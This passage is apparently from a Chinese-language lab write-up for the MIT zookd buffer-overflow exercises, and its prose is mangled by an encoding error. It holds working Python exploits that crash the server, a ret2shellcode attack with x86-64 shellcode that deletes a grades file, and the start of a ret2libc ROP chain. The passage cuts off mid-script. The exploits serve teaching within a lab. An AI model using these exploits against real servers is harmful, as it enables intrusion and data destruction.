+= <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨ <code>envvar</code> è¿›è¡Œæº¢å‡ºæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° zookd æç¤ºäº†å­è¿›ç¨‹æ”¶åˆ°äº† <code>signal 11</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>SIGSEGV</code>ï¼‰ï¼ŒåŒæ—¶æˆ‘ä»¬æ”¶åˆ°çš„å“åº”ä¹Ÿä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸè§¦å‘äº†è¿™ä¸ªæ¼æ´</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT å…¶å®è¿˜è´´å¿ƒåœ°æä¾›äº†ä¸€ä¸ª <code>exploit-template.py</code> æ–‡ä»¶ï¼Œè®©ç¬”è€…è¿™ç§ä¸æ€ä¹ˆä¼šç”¨ socket å†™è£¸ HTTP è¯·æ±‚çš„èœé¸¡å¯ä»¥å‚è€ƒï¼ˆç¬‘ï¼‰ï¼Œ<del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del></p></blockquote><p>å°†æ–‡ä»¶åæ”¹æˆ <code>exploit-2.py</code> åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè¯„æµ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>è¯„æµ‹çš„åŸç†æ˜¯æ£€æŸ¥ <code>/tmp/strace.log</code> å½“ä¸­æ˜¯å¦æœ‰ <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆåæ­£ç¬”è€…ç”µè„‘ä¸Šæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è·³è¿‡äº†ï¼ˆ<del>ğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼‰</p><blockquote><p>ä½†æ˜¯æ¯”è¾ƒ SB çš„æ˜¯è¯„æµ‹ç”¨çš„æ˜¯ MIT ç¼–è¯‘çš„ zookd è€Œä¸æ˜¯æˆ‘ä»¬è‡ªè¡Œç¼–è¯‘çš„ï¼Œç„¶åä»–å°±ä¼šç»™ğŸ‘´æŠ¥è¿™ç§SBé”™è¯¯ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>ç„¶åğŸ‘´è‡ªå·±å†é‡æ–°è¯•ç€è·‘ zookd ä¼šå‘ç°ï¼Œ<del>å› ä¸ºğŸ‘´çš„å­¦ç”ŸğŸ“æ˜¯è€æ—§çš„ Ubuntu20ï¼ŒğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>æœ€åç¬”è€…çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‹‰äº†ä¸€ä¸ª Ubuntu 22.04 çš„å®¹å™¨åœ¨é‡Œé¢åšâ€¦</p></blockquote><h2 id="Part-2-Code-injection"><a href="#Part-2-Code-injection" class="headerlink" title="Part 2: Code injection"></a>Part 2: Code injection</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®©æˆ‘ä»¬è¿›è¡Œä»£ç æ³¨å…¥æ¥åˆ æ‰æœåŠ¡å™¨ä¸Šçš„ <code>/home/student/grades.txt</code> æ–‡ä»¶ï¼ˆè‡ªå·±åˆ›ä¸€ä¸ªå°±è¡Œï¼‰ï¼Œè¦æ±‚æˆ‘ä»¬ä½¿ç”¨æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-exstack</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>å®éªŒè¿˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä»½ shellcode æ¨¡æ¿ <code>shellcode.S</code>ï¼Œå½“æˆ‘ä»¬ <code>make</code> çš„æ—¶å€™å…¶ä¼šè¢«ç¼–è¯‘æˆ <code>shellcode.bin</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>run-shellcode</code> æ¥éªŒè¯å…¶åŠŸèƒ½æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ Exercise3ï¼Œä¿®æ”¹ shellcode ä½¿å…¶èƒ½åˆ é™¤  <code>/home/student/grades.txt</code>ï¼š</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>é‡Œè¾¹æ˜¯<del>ä¸‘é™‹çš„</del> AT&amp;T æ±‡ç¼–ï¼Œç¬”è€…é€‰æ‹©ç›´æ¥é‡å†™ä¸€ä»½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸåˆ é™¤æ–‡ä»¶ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ–‡ä»¶æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ strace æ¥è·Ÿè¸ª zookd æ‰€ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆéœ€è¦rootï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´ç¬”è€…å…ˆèµ·ä¸€ä¸ª zookd å†è¿è¡Œ straceï¼Œä¹‹åç”¨å‰é¢çš„ exp æ‰“ä¸€ä¸‹ zookd å°±å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>å‰é¢çš„è¯„æµ‹åº”è¯¥æ˜¯åŸºäºè¿™ä¸ªå®Œæˆçš„ï¼Œä½†æ˜¯ç¬”è€…å‘ç°åœ¨ <code>/tmp/strace.log</code> å½“ä¸­ä¸ä¼šè®°å½• <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œ<del>ğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰€ä»¥è¿™é‡Œå°±å…ˆâ‘§ç®¡äº†</del></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>ä»¥åŠæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ gdb è¿›è¡Œè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ‰‹å†Œæ‰¯äº†ä¸€å †æ€ä¹ˆè°ƒè¯•ï¼Œè¿™é‡Œå°±ä¸ç®¡äº†ï¼Œä¸‹é¢æ¥çœ‹ Exercise 4ï¼Œå¤§æ¦‚æ˜¯è®©æˆ‘ä»¬ç”¨ ret2shellcode æ¥æ‰“ zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that addressâ€”e.g. a derivative of the provided shell code.</p></blockquote><p>å› ä¸ºæ²¡æœ‰å¼€ ASLR è€Œä¸”æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆç¬”è€…ç›´æ¥ç”¨ <code>nop</code> ä½œä¸º slide code å¹¶åœ¨æ ˆä¸Šé åçš„ä½ç½®å¸ƒç½® shellcode å³å¯ï¼Œè¿™é‡Œæ³¨æ„åˆ«å¿˜äº†æŠŠ shellcode å½“ä¸­çš„ <code>\x00</code> ç¼–ç æˆ <code>%00</code> å¦åˆ™ä¼šè¢«è¿‡æ»¤æ‰</p><blockquote><p>ç¼–å†™ shellcode æ˜¯ pwn æ‰‹æœ€åŸºç¡€çš„æŠ€èƒ½ï¼Œå¦‚æœä½ ä¸ä¼šçš„è¯â€¦â€¦  ï¼šï¼‰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…ç¼–å†™çš„ shellcode å½“ä¸­æœ‰ <code>exit(0)</code> æ‰€ä»¥ä¸ä¼šæŠ¥ SIGSEGVï¼Œä½†æ˜¯æœ‰ä¸ªæ‰“å°å­—ç¬¦ä¸²çš„æ“ä½œè®©æˆ‘ä»¬å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œå¦‚æœä½ æƒ³çœ‹ SIGSEGV ä¹Ÿå¯ä»¥æŠŠæœ€åçš„ exit ä»£ç å»æ‰ï¼šï¼‰</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæµ‹è¯„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks"><a href="#Part-3-Return-to-libc-attacks" class="headerlink" title="Part 3: Return-to-libc attacks"></a>Part 3: Return-to-libc attacks</h2><p>æ¥ä¸‹æ¥ç»ˆäºåˆ°äº†<del>å¤§ä¸€å°æœ‹å‹éƒ½ä¼šçš„</del> ret2libc æ”»å‡»çš„éƒ¨åˆ†ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-nxstack</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼ˆreturn-oriented programmingï¼Œ <strong>ROP</strong>ï¼‰æ˜¯ç”¨æ¥çªç ´åŒ…æ‹¬ ASLRã€æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤åœ¨å†…çš„æœ€ä¸ºç»å…¸çš„æ”»å‡»æ‰‹æ³•ï¼Œ<del>ä½ è¦æ˜¯ä¸ä¼šğŸ‘´ä¹Ÿâ‘§æ•™ä½ ï¼Œè‡ªå·±å­¦å»</del>ï¼Œ<code>ret2libc</code> æŒ‡çš„åˆ™æ˜¯åˆ©ç”¨ libc ä¸­çš„ gadget æ¥å®Œæˆ ROP chain çš„æ„å»º</p><p>å®éªŒæ‰‹å†Œä¸­é—´çš„ä¸€å †ä»‹ç»å’Œè¯´æ˜ç›´æ¥è·³äº†ï¼Œ<del>æ²¡å•¥æ„æ€</del>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¤§è¸æ­¥è¿›å…¥ Exercise 5ï¼šç”¨ <code>ret2libc</code> è¿™ä¸€æ”»å‡»æ‰‹æ³•æ¥å®Œæˆå¯¹ zookd çš„æ”»å‡»</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>é¦–å…ˆ <code>checksec</code> ï¼Œé™¤äº† canary ä»¥å¤–çš„ä¿æŠ¤éƒ½å¼€äº†â€¦</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>å¼€äº† PIE æ¯”è¾ƒéš¾å¼„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ partial overwrite çš„æ–¹å¼æ¥åœ¨ text æ®µçš„åŒä¸€å¼ é¡µé¢ä¸Šè¿›è¡Œä¸€æ¬¡è·³è½¬ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜ä¸çŸ¥é“æˆ‘ä»¬çš„å‚æ•°åˆ° <code>http_request_headers()</code> æ ˆåº•é—´çš„è·ç¦»</p><p>ä¿¡æ¯æ³„éœ²è¿™ä¸€æ­¥æ¯”è¾ƒéš¾å¼„ï¼Œäºæ˜¯ç¬”è€…çœ‹äº†çœ‹å…¶ä»–äººçš„åšæ³•ï¼Œå‘ç°**å¤§å®¶éƒ½æ˜¯ç›´æ¥ç”¨ gdb çœ‹ç¨‹åºä»¥åŠ libc çš„åŸºå€â€¦**ï¼ˆ<del>ğŸ‘´å¯»æ€è¿™â‘ ä¸¶ä¹Ÿâ‘§å®æˆ˜å•Šï¼Œ</del>ä¼°è®¡æ˜¯ä¸ºäº†æ•™å­¦ç›®çš„é™ä½äº†éš¾åº¦ï¼‰</p><blockquote><p>ç¬”è€…æƒ³äº†å¤§åŠå¤©æ€ä¹ˆæ„å»º ROPã€æ€ä¹ˆæ³„éœ² libc åœ°å€ã€é€†äº†åŠå¤©ç¨‹åºæ‰¾å¯ç”¨çš„ gadgetï¼Œæœ€åæ‰çŸ¥é“è¿™ä¸ªå®éªŒæ˜¯ç›´æ¥ç”¨ gdb æŸ¥çœ‹ç¨‹åºä»£ç æ®µ+libc çš„åœ°å€â€¦<del>æŒºæ— è¯­çš„å…¶å®</del></p></blockquote><p>é‚£ç¬”è€…åªå¥½ä¹Ÿè¿™ä¹ˆåšäº†ï¼ˆç¬‘ï¼‰ï¼Œè™½ç„¶è¯´ä»–æä¾›äº†ä¸€ä¸ªè«åå…¶å¦™çš„ <code>accidentially()</code> å‡½æ•°ä½†æ˜¯ç¬”è€…é€‰æ‹©ç›´æ¥å¿½ç•¥ï¼Œéšä¾¿æ‰¾ç¨‹åºä¸­çš„ä¸€ä¸ª <code>ret</code> æ„é€ æ»‘æ¿åé¢è·Ÿ ROP é“¾å³å¯ï¼Œå› ä¸ºè¿™ä¸ª Exercise è¯´å®è¯åšèµ·æ¥è«åå…¶å¦™çš„æ‰€ä»¥ç¬”è€…ä¹Ÿç”¨è«åå…¶å¦™çš„è§£æ³•å¥½äº†ï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œé…åˆ ROPgadget æ‰¾äº†ä¸€äº› gadget éšä¾¿å‡‘äº†ä¸€ä¸ªå¯ç”¨çš„ ROP chainï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>    <br>    func_malloc = libc_base + 